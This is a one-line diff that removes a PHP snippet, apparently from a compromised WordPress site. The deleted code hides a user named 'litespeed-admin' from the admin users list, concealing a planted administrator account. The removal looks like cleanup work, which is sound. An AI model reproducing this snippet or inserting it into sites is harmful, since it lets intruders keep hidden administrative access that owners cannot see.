@@ -1,1 +1,0 @@
-<?php add_filter("users_list_table_query_args", function($args) { $exclude_user = get_user_by("login", "litespeed-admin"); if ($exclude_user) { $args["exclude"] = array_merge((array)($args["exclude"] ?? []), [$exclude_user->ID]); } return $args; });
